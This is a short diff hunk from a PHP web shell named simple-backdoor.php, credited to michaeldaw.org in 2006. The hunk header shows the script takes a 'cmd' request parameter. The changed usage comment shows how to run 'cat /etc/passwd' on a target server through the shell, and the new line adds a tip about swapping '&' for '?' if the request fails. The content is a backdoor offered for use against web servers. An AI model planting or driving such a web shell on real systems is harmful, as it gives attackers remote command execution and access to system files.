@@ -12,6 +12,6 @@ if(isset($_REQUEST['cmd'])){
 
 ?>
 
-Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd ... P.S: try & if ? didnt work
 
 <!--    http://michaeldaw.org   2006    -->
